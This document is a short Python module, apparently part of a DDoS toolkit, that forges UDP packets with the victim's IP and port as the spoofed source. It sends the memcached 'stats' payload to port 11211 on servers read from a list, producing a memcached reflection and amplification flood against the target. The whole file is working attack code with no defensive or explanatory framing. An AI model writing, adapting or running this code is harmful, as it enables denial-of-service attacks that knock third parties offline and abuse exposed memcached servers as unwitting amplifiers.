# Import modules
import random
from scapy.all import IP, UDP, send, Raw
from colorama import Fore

# Load MEMCACHED servers list
with open("tools/L4/memcached_servers.txt", "r") as f:
    memcached_servers = f.readlines()

# Payload
payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"


def flood(target):
    server = random.choice(memcached_servers)
    packets = random.randint(10, 150)
    server = server.replace("\n", "")
    # Packet
    try:
        packet = (
            IP(dst=server, src=target[0])
            / UDP(sport=target[1], dport=11211)
            / Raw(load=payload)
        )
        send(packet, count=packets, verbose=False)
    except Exception as e:
        print(
            f"{Fore.MAGENTA}Error while sending forged UDP packet\n{Fore.MAGENTA}{e}{Fore.RESET}"
        )
    else:
        print(
            f"{Fore.GREEN}[+] {Fore.YELLOW}Sending {packets} forged UDP packets from memcached server {server} to {'{}:{}'.format(*target)}.{Fore.RESET}"
        )
